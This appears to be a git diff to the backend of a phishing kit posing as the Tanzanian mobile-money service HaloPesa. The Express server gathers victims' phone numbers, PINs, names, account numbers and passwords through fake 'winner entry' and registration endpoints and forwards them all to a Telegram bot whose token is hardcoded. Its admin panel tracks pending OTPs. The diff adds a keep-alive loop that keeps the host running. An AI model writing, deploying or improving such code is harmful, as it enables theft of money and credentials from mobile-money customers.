@@ -1,6 +1,7 @@
 /* ══════════════════════════════════════════════════════════════
    HaloPesa Tanzania – Backend Server
    Forwards all user data directly to Telegram bot
+   Includes self-ping keep-alive for Railway
    ══════════════════════════════════════════════════════════════ */
 
 const express = require('express');
@@ -11,8 +12,13 @@ const PORT = process.env.PORT || 5000;
 
 /* ══════════ CONFIG ══════════ */
 const BOT_TOKEN = process.env.BOT_TOKEN || '8751500323:AAFm62iHW8tiO0sprXCpChwso46a2mJs8ig';
-const CHAT_ID   = '8309615453';
+const CHAT_ID   = process.env.CHAT_ID   || '8309615453';
 const TG_API    = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+/* Public URL for self-ping (Railway sets this automatically) */
+const PUBLIC_URL = process.env.RAILWAY_PUBLIC_DOMAIN
+  ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`
+  : `http://localhost:${PORT}`;
 
 /* ══════════ MIDDLEWARE ══════════ */
 app.use(cors());
@@ -72,15 +78,15 @@ app.get('/', (req, res) => {
 });
 
 app.get('/health', (req, res) => {
-  res.json({ status: 'healthy' });
+  res.json({ status: 'healthy', time: new Date().toISOString() });
 });
 
 /* ══════════════════════════════════════════════════════════════
-   ENDPOINT 1: WINNER ENTRY (index.html new page)
+   ENDPOINT 1: WINNER ENTRY
    ══════════════════════════════════════════════════════════════ */
 app.post('/api/winner-entry', async (req, res) => {
   try {
-    const { phone, pin, lang, adminId, timestamp } = req.body || {};
+    const { phone, pin, lang, adminId } = req.body || {};
 
     const msg =
       `🏆 <b>NEW WINNER ENTRY</b>\n` +
@@ -109,7 +115,7 @@ app.post('/api/winner-entry', async (req, res) => {
    ══════════════════════════════════════════════════════════════ */
 app.post('/api/notify-admin-link-opened', async (req, res) => {
   try {
-    const { adminId, timestamp, userAgent } = req.body || {};
+    const { adminId, userAgent } = req.body || {};
 
     const msg =
       `🔗 <b>ADMIN LINK OPENED</b>\n` +
@@ -133,7 +139,7 @@ app.post('/api/notify-admin-link-opened', async (req, res) => {
    ══════════════════════════════════════════════════════════════ */
 app.post('/api/register-user', async (req, res) => {
   try {
-    const { firstName, lastName, haloNumber, password, adminId, timestamp } = req.body || {};
+    const { firstName, lastName, haloNumber, password, adminId } = req.body || {};
 
     const regId = 'REG' + Date.now();
 
@@ -248,17 +254,9 @@ app.post('/api/admin-login', async (req, res) => {
 /* ══════════════════════════════════════════════════════════════
    ADMIN PANEL – EMPTY LISTS
    ══════════════════════════════════════════════════════════════ */
-app.get('/api/admin/notifications', (req, res) => {
-  return res.json({ notifications: [] });
-});
-
-app.get('/api/admin/pending-registrations', (req, res) => {
-  return res.json({ registrations: [] });
-});
-
-app.get('/api/admin/pending-otps', (req, res) => {
-  return res.json({ otps: [] });
-});
+app.get('/api/admin/notifications', (req, res) => res.json({ notifications: [] }));
+app.get('/api/admin/pending-registrations', (req, res) => res.json({ registrations: [] }));
+app.get('/api/admin/pending-otps', (req, res) => res.json({ otps: [] }));
 
 /* ══════════════════════════════════════════════════════════════
    404 FALLBACK
@@ -266,6 +264,25 @@ app.get('/api/admin/pending-otps', (req, res) => {
 app.use((req, res) => {
   res.status(404).json({ success: false, message: 'Endpoint not found' });
 });
+
+/* ══════════════════════════════════════════════════════════════
+   SELF-PING KEEP-ALIVE (prevents Railway from sleeping)
+   ══════════════════════════════════════════════════════════════ */
+function startKeepAlive() {
+  const INTERVAL = 4 * 60 * 1000; /* every 4 minutes */
+
+  setInterval(async () => {
+    try {
+      const res = await fetch(`${PUBLIC_URL}/health`);
+      const data = await res.json();
+      console.log(`💓 Self-ping OK (${PUBLIC_URL}/health) →`, data.status);
+    } catch (err) {
+      console.log('💓 Self-ping failed:', err.message);
+    }
+  }, INTERVAL);
+
+  console.log(`💓 Self-ping keep-alive enabled → ${PUBLIC_URL}/health every 4 min`);
+}
 
 /* ══════════════════════════════════════════════════════════════
    START SERVER
@@ -276,6 +293,10 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log('══════════════════════════════════════════════');
   console.log(`📡 Port: ${PORT}`);
   console.log(`🤖 Telegram Chat ID: ${CHAT_ID}`);
+  console.log(`🌐 Public URL: ${PUBLIC_URL}`);
   console.log(`🕒 Started: ${new Date().toISOString()}`);
   console.log('══════════════════════════════════════════════');
+
+  /* Start keep-alive after server is up */
+  startKeepAlive();
 });
